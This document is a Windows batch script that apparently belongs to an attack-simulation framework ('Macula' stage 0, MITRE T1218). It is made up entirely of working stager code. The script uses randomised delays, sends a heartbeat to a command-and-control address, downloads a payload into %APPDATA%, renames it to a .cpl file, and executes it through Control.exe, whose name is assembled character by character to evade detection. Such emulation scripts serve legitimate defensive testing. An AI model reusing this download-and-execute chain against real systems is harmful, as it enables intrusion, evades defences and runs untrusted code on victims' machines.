@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET yktnwwf=%APPDATA%\8738\61518a54
SET fpakbq=Macula-Stage0-8738
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8738-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=dxdiag.txt
SET fpldhe=8738
SET zdlgnu=%APPDATA%\!yydue!\macula-simulations.log
SET /A dmixqf=!RANDOM! %% 31 + 30
timeout /t !dmixqf! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_complete=!dmixqf!>> "!zdlgnu!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: c2_heartbeat_start=>> "!zdlgnu!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: c2_heartbeat_complete=>> "!zdlgnu!" 2>nul
SET /A kexmup=!RANDOM! %% 11 + 5
ping -n !kexmup! 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: mid_delay_complete=!kexmup!>> "!zdlgnu!" 2>nul
IF NOT EXIST "!yktnwwf!" mkdir "!yktnwwf!" >nul 2>&1
SET down_url=!repbmqg!
SET down_file=!yktnwwf!\!edjwtl!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_start=!down_url!>> "!zdlgnu!" 2>nul
curl -k -s -o "!down_file!" "!down_url!"
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=0:download_failed>> "!zdlgnu!" 2>nul
    exit /b 1
)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_complete=!down_file!>> "!zdlgnu!" 2>nul
SET c1=C
SET c2=o
SET c3=n
SET c4=t
SET c5=r
SET c6=o
SET c7=l
SET c8=.
SET c9=e
SET c10=x
SET c11=e
SET lolbin=!c1!!c2!!c3!!c4!!c5!!c6!!c7!!c8!!c9!!c10!!c11!
SET /A rcqoem=!RANDOM! %% 20 + 10
CHOICE /C Y /N /D Y /T !rcqoem! >nul
SET new_name=!yktnwwf!\file.cpl
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_start=!new_name!>> "!zdlgnu!" 2>nul
ren "!down_file!" "file.cpl" >nul 2>&1
IF NOT EXIST "!new_name!" (
    echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=0:rename_failed>> "!zdlgnu!" 2>nul
    exit /b 1
)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_complete=>> "!zdlgnu!" 2>nul
SET p1=f
SET p2=i
SET p3=l
SET p4=e
SET p5=.
SET p6=c
SET p7=p
SET p8=l
SET cpl_name=!p1!!p2!!p3!!p4!!p5!!p6!!p7!!p8!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_start=!lolbin! !cpl_name!>> "!zdlgnu!" 2>nul
!lolbin! "!yktnwwf!\!cpl_name!"
SET ttp_result=1
SET err_detail=
IF !ERRORLEVEL! NEQ 0 (
    SET ttp_result=0
    SET err_detail=control_exec_failed
)
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttp_result!:!err_detail!>> "!zdlgnu!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_complete=!ERRORLEVEL!>> "!zdlgnu!" 2>nul
ENDLOCAL